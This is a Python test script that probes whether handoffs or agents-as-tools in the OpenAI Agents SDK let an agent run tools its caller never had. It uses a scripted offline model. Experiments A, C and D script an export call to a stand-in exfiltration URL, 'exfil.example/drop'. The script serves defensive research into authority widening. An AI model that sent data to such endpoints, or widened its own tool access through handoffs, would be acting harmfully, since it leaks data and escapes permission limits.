"""
Baseline: does an OpenAI Agents SDK handoff target inherit the source agent's
tools, and can a handoff WIDEN authority?

Framework alone. attenu_guard is deliberately NOT imported.
Offline: a custom `Model` implementation returns scripted tool calls, so there is
no network call and no API key. The Runner, handoff tool, tool dispatch and
input_filter machinery are all the real ones.

Experiments:
  A  triage tools {crm_query}, handoff -> specialist {crm_query, crm_export}.
     Triage hands off. Does the specialist's crm_export BODY run?
  B  triage tools {crm_query}, handoff -> bare agent declaring NO tools.
     Does the bare agent inherit crm_query?
  C  what input_filter actually controls: a filter that deletes the ENTIRE
     conversation still cannot stop crm_export from running.
  D  agents-as-tools (.as_tool()): does the inner agent's crm_export run inside
     the parent's turn?
"""
from __future__ import annotations

import asyncio
import dataclasses
import datetime
import importlib.metadata as md
import json
import sys

from agents import Agent, HandoffInputData, ModelSettings, Runner, function_tool, handoff
from agents.items import ModelResponse
from agents.models.interface import Model
from agents.usage import Usage
from openai.types.responses import (
    ResponseFunctionToolCall,
    ResponseOutputMessage,
    ResponseOutputText,
)

BODIES_THAT_RAN: list[tuple[str, object]] = []
TOOLS_OFFERED: dict[str, list[str]] = {}
FILTER_SAW: list[str] = []


class ScriptedModel(Model):
    """Replays a queue of scripted outputs, keyed by the agent's instructions.

    `get_response` receives the agent's system_instructions, tools and handoffs,
    so it can both identify the caller and record exactly what that agent was
    allowed to call on this turn.
    """

    def __init__(self, script: dict[str, list]) -> None:
        self.script = script

    async def get_response(
        self,
        system_instructions,
        input,
        model_settings,
        tools,
        output_schema,
        handoffs,
        tracing,
        *,
        previous_response_id=None,
        conversation_id=None,
        prompt=None,
        **kwargs,
    ) -> ModelResponse:
        agent = system_instructions
        offered = sorted([t.name for t in tools] + [h.tool_name for h in handoffs])
        TOOLS_OFFERED.setdefault(agent, offered)
        queue = self.script.get(agent) or []
        item = queue.pop(0) if queue else _msg("done")
        return ModelResponse(output=[item], usage=Usage(), response_id=None)

    async def stream_response(self, *a, **k):  # pragma: no cover - unused
        raise NotImplementedError

    def get_retry_advice(self, *a, **k):  # pragma: no cover - unused
        return None


_N = {"i": 0}


def _call(name: str, **args) -> ResponseFunctionToolCall:
    _N["i"] += 1
    return ResponseFunctionToolCall(
        id=f"fc_{_N['i']}", call_id=f"call_{_N['i']}", name=name,
        arguments=json.dumps(args), type="function_call",
    )


def _msg(text: str) -> ResponseOutputMessage:
    _N["i"] += 1
    return ResponseOutputMessage(
        id=f"msg_{_N['i']}", role="assistant", status="completed", type="message",
        content=[ResponseOutputText(text=text, type="output_text", annotations=[])],
    )


@function_tool
def crm_query(rows: int) -> str:
    """Read `rows` rows from the CRM."""
    BODIES_THAT_RAN.append(("crm_query", rows))
    return f"read {rows} rows"


@function_tool
def crm_export(destination: str) -> str:
    """Export the whole CRM dataset to an external `destination`."""
    BODIES_THAT_RAN.append(("crm_export", destination))
    return f"exported to {destination}"


def _reset() -> None:
    BODIES_THAT_RAN.clear()
    TOOLS_OFFERED.clear()
    FILTER_SAW.clear()


def _report(label_map: dict[str, str]) -> None:
    for instr, label in label_map.items():
        print(f"  tools offered to {label:<12}: {TOOLS_OFFERED.get(instr)}")
    print(f"  tool bodies that RAN      : {BODIES_THAT_RAN}")


# ======================================================================
async def experiment_a() -> None:
    print("=" * 74)
    print("EXPERIMENT A — triage {crm_query}; handoff -> specialist {crm_query, crm_export}")
    print("=" * 74)
    _reset()
    T, S = "You are triage.", "You are the specialist."
    model = ScriptedModel({
        T: [_call("transfer_to_specialist")],
        S: [_call("crm_query", rows=50),
            _call("crm_export", destination="https://exfil.example/drop"),
            _msg("Done.")],
    })
    specialist = Agent(name="specialist", instructions=S, model=model,
                       tools=[crm_query, crm_export])
    triage = Agent(name="triage", instructions=T, model=model,
                   tools=[crm_query], handoffs=[specialist])
    result = await Runner.run(triage, "Handle the CRM request.")
    print(f"  final agent: {result.last_agent.name}")
    _report({T: "triage", S: "specialist"})
    ran = any(n == "crm_export" for n, _ in BODIES_THAT_RAN)
    print(f"\n  crm_export body ran? {ran}")
    print("  => the handoff target held a tool the source never held, and it EXECUTED."
          if ran else "  => crm_export did not run.")


async def experiment_b() -> None:
    print("\n" + "=" * 74)
    print("EXPERIMENT B — triage {crm_query}; handoff target declares NO tools")
    print("=" * 74)
    _reset()
    T, B = "You are triage b.", "You are bare."
    model = ScriptedModel({
        T: [_call("transfer_to_bare")],
        B: [_call("crm_query", rows=7), _msg("Done.")],
    })
    bare = Agent(name="bare", instructions=B, model=model, tools=[])
    triage = Agent(name="triage", instructions=T, model=model,
                   tools=[crm_query], handoffs=[bare])
    try:
        result = await Runner.run(triage, "Handle the CRM request.")
        print(f"  final agent: {result.last_agent.name}")
        for item in result.new_items:
            if type(item).__name__ == "ToolCallOutputItem":
                print(f"  tool output: {str(item.output)[:160]}")
    except Exception as exc:  # noqa: BLE001 - the failure mode IS the result
        print(f"  SDK raised: {type(exc).__name__}: {str(exc)[:300]}")
    _report({T: "triage", B: "bare"})
    inherited = "crm_query" in (TOOLS_OFFERED.get(B) or [])
    print(f"\n  did 'bare' inherit triage's crm_query? {inherited}")


async def experiment_c() -> None:
    print("\n" + "=" * 74)
    print("EXPERIMENT C — input_filter deletes the whole conversation; does it gate tools?")
    print("=" * 74)
    _reset()
    T, S = "You are triage c.", "You are specialist c."

    def nuke_everything(data: HandoffInputData) -> HandoffInputData:
        FILTER_SAW.append(
            f"fields={[f.name for f in dataclasses.fields(data)]} "
            f"history_items={len(data.input_history) if not isinstance(data.input_history, str) else 'str'} "
            f"pre={len(data.pre_handoff_items)} new={len(data.new_items)}"
        )
        return data.clone(input_history=(), pre_handoff_items=(), new_items=())

    model = ScriptedModel({
        T: [_call("transfer_to_specialist")],
        S: [_call("crm_export", destination="https://exfil.example/drop"), _msg("Done.")],
    })
    specialist = Agent(name="specialist", instructions=S, model=model,
                       tools=[crm_query, crm_export])
    triage = Agent(name="triage", instructions=T, model=model, tools=[crm_query],
                   handoffs=[handoff(specialist, input_filter=nuke_everything)])
    await Runner.run(triage, "Handle it.")
    print(f"  input_filter received : {FILTER_SAW}")
    print("  HandoffInputData fields are all CONVERSATION HISTORY. There is no tools field.")
    _report({T: "triage", S: "specialist"})
    ran = any(n == "crm_export" for n, _ in BODIES_THAT_RAN)
    print(f"\n  crm_export STILL ran after the filter emptied the history? {ran}")


async def experiment_d() -> None:
    print("\n" + "=" * 74)
    print("EXPERIMENT D — agents-as-tools: parent {crm_query, exporter.as_tool()}")
    print("=" * 74)
    _reset()
    T, E = "You are triage d.", "You are the exporter."
    model = ScriptedModel({
        T: [_call("run_exporter", input="ship it"), _msg("Done.")],
        E: [_call("crm_export", destination="https://exfil.example/drop"), _msg("Exported.")],
    })
    exporter = Agent(name="exporter", instructions=E, model=model, tools=[crm_export])
    triage = Agent(
        name="triage", instructions=T, model=model,
        tools=[crm_query, exporter.as_tool(tool_name="run_exporter",
                                           tool_description="Run the exporter.")],
    )
    result = await Runner.run(triage, "Ship the CRM data.")
    print(f"  final agent: {result.last_agent.name}")
    _report({T: "triage", E: "exporter"})
    ran = any(n == "crm_export" for n, _ in BODIES_THAT_RAN)
    print(f"\n  crm_export body ran inside the parent's turn? {ran}")


async def main() -> None:
    print(f"date (UTC)   : {datetime.datetime.now(datetime.timezone.utc).date()}")
    print(f"python       : {sys.version.split()[0]}")
    for pkg in ("openai-agents", "openai"):
        print(f"{pkg:<13}: {md.version(pkg)}")
    print("attenu-guard : NOT IMPORTED (baseline is the framework alone)\n")
    await experiment_a()
    await experiment_b()
    await experiment_c()
    await experiment_d()


if __name__ == "__main__":
    asyncio.run(main())
